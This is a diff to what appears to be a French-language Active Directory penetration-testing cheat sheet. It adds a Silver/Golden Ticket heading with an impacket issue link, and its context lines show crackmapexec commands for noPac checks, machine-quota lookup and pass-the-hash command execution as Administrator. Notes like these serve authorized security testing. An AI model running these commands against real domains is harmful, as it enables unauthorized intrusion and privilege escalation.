@@ -39,6 +39,10 @@ Synchroniser l'horloge:
 	- check SamAccountName: `crackmapexec smb <ip> -M nopac` & `crackmapexec ldap -d <Domain> -u <user> -p <pass> -M Maq` (max machines à créer)
 	- Pass The Hash: `crackmapexec <ip> -u Administrator -H <lmhash:nthash> -x 'whoami'`
 
+## Silver/Golden Ticket
+
+https://github.com/fortra/impacket/issues/1457
+
 ## Shell
 
 **Domain.local/Administrator@127.0.0.1**
